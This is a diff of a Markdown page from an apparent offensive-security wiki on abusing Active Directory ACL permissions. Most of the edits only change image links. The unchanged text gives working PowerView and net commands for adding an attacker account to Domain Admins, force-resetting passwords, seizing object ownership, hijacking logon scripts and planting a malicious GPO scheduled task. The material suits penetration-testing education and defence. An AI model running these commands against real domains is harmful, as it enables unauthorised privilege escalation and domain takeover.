@@ -10,7 +10,7 @@ Active Directory objects such as users and groups are securable objects and DACL
 
 An example of ACEs for the "Domain Admins" securable object can be seen here:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/1.png)
+![](<../../.gitbook/assets/1 (1).png>)
 
 Some of the Active Directory object permissions and types that we as attackers are interested in:
 
@@ -34,11 +34,11 @@ Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRigh
 
 We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/2.png)
+![](../../.gitbook/assets/2.png)
 
 We can reset user's `delegate` password without knowing the current password:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/3.png)
+![](../../.gitbook/assets/3.png)
 
 ## GenericAll on Group
 
@@ -48,7 +48,7 @@ Let's see if `Domain admins` group has any weak permissions. First of, let's get
 Get-NetGroup "domain admins" -FullData
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/4.png)
+![](../../.gitbook/assets/4.png)
 
 ```csharp
  Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
@@ -56,7 +56,7 @@ Get-NetGroup "domain admins" -FullData
 
 We can see that our attacking user `spotless` has `GenericAll` rights once again:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/5.png)
+![](../../.gitbook/assets/5.png)
 
 Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:
 
@@ -64,7 +64,7 @@ Effectively, this allows us to add ourselves (the user `spotless`) to the `Domai
 net group "domain admins" spotless /add /domain
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/6.gif)
+![](../../.gitbook/assets/6.gif)
 
 Same could be achieved with Active Directory or PowerSploit module:
 
@@ -84,7 +84,7 @@ If you have these privileges on a Computer object, you can pull [Kerberos **Reso
 
 If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/7.png)
+![](../../.gitbook/assets/7.png)
 
 We can again add ourselves to the `Domain Admins` group and escalate privileges:
 
@@ -92,19 +92,19 @@ We can again add ourselves to the `Domain Admins` group and escalate privileges:
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/8.png)
+![](../../.gitbook/assets/8.png)
 
 ## Self (Self-Membership) on Group
 
 Another privilege that enables the attacker adding themselves to a group:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/9.png)
+![](../../.gitbook/assets/9.png)
 
 ```csharp
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/10.png)
+![](../../.gitbook/assets/10.png)
 
 ## WriteProperty (Self-Membership)
 
@@ -114,13 +114,13 @@ One more privilege that enables the attacker adding themselves to a group:
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/11.png)
+![](../../.gitbook/assets/11.png)
 
 ```csharp
 net group "domain admins" spotless /add /domain
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/12.png)
+![](../../.gitbook/assets/12.png)
 
 ## **ForceChangePassword**
 
@@ -130,7 +130,7 @@ If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can r
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/13.png)
+![](../../.gitbook/assets/13.png)
 
 Doing the same with powerview:
 
@@ -138,7 +138,7 @@ Doing the same with powerview:
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/14.png)
+![](../../.gitbook/assets/14.png)
 
 Another method that does not require fiddling with password-secure-string conversion:
 
@@ -147,7 +147,7 @@ $c = Get-Credential
 Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/15.png)
+![](../../.gitbook/assets/15.png)
 
 ...or a one liner if no interactive session is not available:
 
@@ -155,7 +155,7 @@ Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/16.png)
+![](../../.gitbook/assets/16.png)
 
 and one last way yo achieve this from linux:
 
@@ -174,7 +174,7 @@ More info:
 
 Note how before the attack the owner of `Domain Admins` is `Domain Admins`:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/17.png)
+![](../../.gitbook/assets/17.png)
 
 After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
 
@@ -182,7 +182,7 @@ After the ACE enumeration, if we find that a user in our control has `WriteOwner
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/18.png)
+![](../../.gitbook/assets/18.png)
 
 ...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:
 
@@ -192,7 +192,7 @@ Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -Ow
 Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/19.png)
+![](../../.gitbook/assets/19.png)
 
 ## GenericWrite on User
 
@@ -200,7 +200,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/20.png)
+![](../../.gitbook/assets/20.png)
 
 `WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:
 
@@ -210,13 +210,13 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 
 Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/21.png)
+![](../../.gitbook/assets/21.png)
 
 ## WriteDACL + WriteOwner
 
 If you are the owner of a group, like I'm the owner of a `Test` AD group:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/22.png)
+![](../../.gitbook/assets/22.png)
 
 Which you can of course do through powershell:
 
@@ -224,11 +224,11 @@ Which you can of course do through powershell:
 ([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/23.png)
+![](../../.gitbook/assets/23.png)
 
 And you have a `WriteDACL` on that AD object:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/24.png)
+![](../../.gitbook/assets/24.png)
 
 ...you can give yourself [`GenericAll`](broken-reference/) privileges with a sprinkle of ADSI sorcery:
 
@@ -242,7 +242,7 @@ $ADSI.psbase.commitchanges()
 
 Which means you now fully control the AD object:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/25.png)
+![](../../.gitbook/assets/25.png)
 
 This effectively means that you can now add new users to the group.
 
@@ -256,7 +256,9 @@ $acl.AddAccessRule($ace)
 Set-Acl -Path $path -AclObject $acl
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/26.png)
+![](../../.gitbook/assets/26.png)
+
+
 
 ## **Replication on the domain (DCSync)**
 
@@ -267,7 +269,7 @@ The **DCSync** permission implies having these permissions over the domain itsel
 
 Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a13.png)
+![](../../.gitbook/assets/a13.png)
 
 We can see this by leveraging PowerView like so:
 
@@ -277,7 +279,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 
 The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a14.png)
+![](../../.gitbook/assets/a14.png)
 
 [**More about general AD ACL/ACE abuse here.**](acl-persistence-abuse.md)
 
@@ -285,7 +287,7 @@ The below indicates that the user `offense\spotless` has **WriteProperty**, **Wr
 
 We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a15.png)
+![](../../.gitbook/assets/a15.png)
 
 If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
 
@@ -293,7 +295,7 @@ If we want to search for misconfigured GPOs specifically, we can chain multiple 
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a16.png)
+![](../../.gitbook/assets/a16.png)
 
 #### Computers with a Given Policy Applied <a href="#computers-with-a-given-policy-applied" id="computers-with-a-given-policy-applied"></a>
 
@@ -303,7 +305,7 @@ We can now resolve the computer names the GPO `Misconfigured Policy` is applied 
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a17.png)
+![](../../.gitbook/assets/a17.png)
 
 #### Policies Applied to a Given Computer <a href="#policies-applied-to-a-given-computer" id="policies-applied-to-a-given-computer"></a>
 
@@ -311,7 +313,7 @@ Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -A
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
 
-![.gitbook/assets/1663788077.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788076/jbvjxajsewijkc1clftc.png)
+![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)
 
 #### OUs with a Given Policy Applied <a href="#ous-with-a-given-policy-applied" id="ous-with-a-given-policy-applied"></a>
 
@@ -319,7 +321,7 @@ Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
 
-![.gitbook/assets/1663788077.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788077/cx1ldljnv8rip1i7ra8o.png)
+![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)
 
 #### Abusing Weak GPO Permissions <a href="#abusing-weak-gpo-permissions" id="abusing-weak-gpo-permissions"></a>
 
@@ -329,23 +331,23 @@ One of the ways to abuse this misconfiguration and get code execution is to crea
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a19.png)
+![](../../.gitbook/assets/a19.png)
 
 The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a20.png)
+![](../../.gitbook/assets/a20.png)
 
 ### Force Policy Update <a href="#force-policy-update" id="force-policy-update"></a>
 
 ScheduledTask and its code will execute after the policy updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a21.png)
+![](../../.gitbook/assets/a21.png)
 
 ### Under the hood <a href="#under-the-hood" id="under-the-hood"></a>
 
 If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
 
-![.gitbook/assets/1663788077.png](../../.gitbook/assets/a22.png)
+![](../../.gitbook/assets/a22.png)
 
 Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:
 
